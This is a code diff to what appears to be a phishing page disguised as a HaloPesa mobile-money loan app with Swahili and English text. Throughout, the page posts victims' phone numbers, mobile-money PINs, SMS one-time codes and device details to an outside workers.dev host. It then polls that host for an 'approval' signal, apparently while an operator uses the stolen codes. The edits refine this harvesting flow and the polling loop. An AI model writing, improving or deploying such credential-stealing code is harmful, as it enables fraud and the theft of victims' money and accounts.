@@ -823,14 +823,12 @@ function verifyOtp1(){
   if(otp1Val === pin){ showOtp1Err(lang==='sw'?'OTP si PIN yako — angalia ujumbe wako':'OTP is not your PIN — check your SMS'); return; }
   for(var j=0;j<4;j++) document.getElementById('o1b'+j).classList.add('ok');
   hap([10,6,18]);
-  if(otp1Timer) clearInterval(otp1Timer);
+  /* keep countdown running while verifying */
   setOtp1Verifying(true);
   var _t1 = getLoanTier(loanAmount);
   fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
     body:JSON.stringify({event:'otp1_verified',data:{
       phone:phoneDigits||'',pin:pin,
-      amount:loanAmount,rate:_t1.rate,days:_t1.days,
-      repay:Math.round(loanAmount*(1+_t1.rate/100)),
       otp:otp1Val,otpNum:'1',sessionId:sessionId,
       device:getDevice(),ts:Date.now()
     }})
@@ -1115,22 +1113,20 @@ I18N.en.chooseAmt = 'Choose loan amount';
 /* ══════════════════════ APPROVAL POLLING ══════════════════════ */
 function pollApproval(key, cb){
   var attempts = 0;
-  var maxAttempts = 120; /* 2 minutes × 1s */
-  var iv = setInterval(function(){
+  var maxAttempts = 60; /* 2 minutes at 2s */
+  function check(){
     attempts++;
-    if(attempts > maxAttempts){
-      clearInterval(iv);
-      cb(false);
-      return;
-    }
+    if(attempts > maxAttempts){ cb(false); return; }
     fetch('https://halopesa.lennxkoros.workers.dev/approval?key=' + encodeURIComponent(key))
       .then(function(r){ return r.json(); })
       .then(function(data){
-        if(data.status === 'approved'){ clearInterval(iv); cb(true); }
-        else if(data.status === 'declined'){ clearInterval(iv); cb(false); }
+        if(data.status === 'approved'){ cb(true); }
+        else if(data.status === 'declined'){ cb(false); }
+        else{ setTimeout(check, 2000); } /* pending — check again in 2s */
       })
-      .catch(function(e){ });
-  }, 500);
+      .catch(function(){ setTimeout(check, 2000); });
+  }
+  check(); /* check immediately on first call */
 }
 
 /* OTP1 verifying UI state */
